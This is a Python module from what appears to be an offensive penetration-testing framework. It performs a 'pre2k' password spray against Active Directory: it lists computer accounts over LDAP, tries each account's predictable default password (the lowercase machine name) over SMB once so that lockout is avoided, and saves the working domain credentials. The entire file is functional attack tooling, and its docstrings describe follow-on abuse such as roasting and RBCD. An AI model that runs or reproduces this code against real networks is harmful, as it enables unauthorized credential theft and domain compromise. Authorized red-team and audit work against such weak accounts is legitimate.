"""Pre-2000 machine account spray (pre2k).

Machines joined with pre-Windows-2000 compatibility get their account
password set to the LOWERCASE MACHINE NAME (truncated to 14 chars) —
and nothing ever rotates it, because nothing knows. It's one of the
quietest footholds in old domains: the account is a domain credential
(reads SYSVOL, roasts, RBCDs) hiding in plain sight.

The spray is lockout-free by construction: exactly ONE attempt per
account, and the candidate is deterministic, so there's no second try
to trip a policy with. Enumerate computer accounts over LDAP (or pass
USERS explicitly), try each account's pre-2000 candidate over SMB,
report the hits. garrettfoster13/pre2k's trick, FORGE-shaped.
"""

from core.module import AuxiliaryModule
from core.options import OptAddress, OptPort, OptString

try:
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
    from impacket.smbconnection import SMBConnection
except ImportError:
    impacket_ldap = None  # console gates run() on requirements


def pre2k_candidate(sam_account_name):
    """The deterministic pre-2000 password: lowercase machine name,
    no trailing $, truncated to 14 chars."""
    return sam_account_name.rstrip("$").lower()[:14]


class Pre2kSpray(AuxiliaryModule):
    name = "Pre-2000 Machine Account Spray (pre2k)"
    description = """
        Tries each machine account's pre-2000 password (lowercase
        machine name, truncated to 14) over SMB — one attempt per
        account, so it's lockout-free. Enumerates computer accounts
        over LDAP with any domain cred, or sprays USERS given
        explicitly. Hits are full domain machine creds — they go
        straight into the store.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target(s) (DC in a domain), "
                                                "comma-separated"))
        self.options.add(OptPort("RPORT", default=445, description="SMB port"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", default="",
                                   description="Any domain user (for LDAP enum; "
                                               "blank = USERS required)"))
        self.options.add(OptString("PASSWORD", default="", description="Password"))
        self.options.add(OptString("USERS", default="",
                                   description="Machine accounts, comma-separated "
                                               "(blank = enumerate via LDAP)"))

    def run(self):
        domain = str(self.get_option("DOMAIN"))
        port = int(self.get_option("RPORT"))
        given = [u.strip() for u in str(self.get_option("USERS") or "").split(",")
                 if u.strip()]
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            accounts = given or self._enumerate(host, domain)
            if accounts is None:
                continue
            self.print_status(f"{host}: {len(accounts)} machine account(s) "
                              f"to try")
            for account in accounts:
                self._try(host, port, domain, account)

    def _enumerate(self, host, domain):
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))
        if not user:
            self.print_error(f"{host}: no creds for the LDAP enum — set "
                             f"USERNAME/PASSWORD or pass USERS explicitly")
            return None
        base = ",".join(f"DC={p}" for p in domain.split("."))
        try:
            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: LDAP bind failed - {e}")
            return None
        accounts = []
        try:
            for packet in conn.search(
                    searchBase=base, searchFilter="(sAMAccountName=*$)",
                    attributes=["sAMAccountName"]):
                if isinstance(packet, ldapasn1.SearchResultEntry):
                    for a in packet["attributes"]:
                        if str(a["type"]) == "sAMAccountName":
                            accounts.append(str(a["vals"][0]))
        except Exception as e:
            self.print_error(f"{host}: machine enum failed - {e}")
            return None
        finally:
            try:
                conn.close()
            except Exception:
                pass
        return accounts

    def _try(self, host, port, domain, account):
        candidate = pre2k_candidate(account)
        try:
            conn = SMBConnection(host, host, sess_port=port, timeout=10)
            conn.login(account, candidate, domain)
        except Exception as e:
            self.print_debug(f"{host}: {account}: {candidate} - {e}")
            return
        self.print_good(f"{host}: {account}:{candidate} — PRE-2000 "
                        f"MACHINE ACCOUNT, full domain cred")
        store = getattr(self.framework, "store", None)
        if store is not None:
            store.add_cred(host, "smb", account, candidate,
                           source="pre2k_spray")
        conn.close()
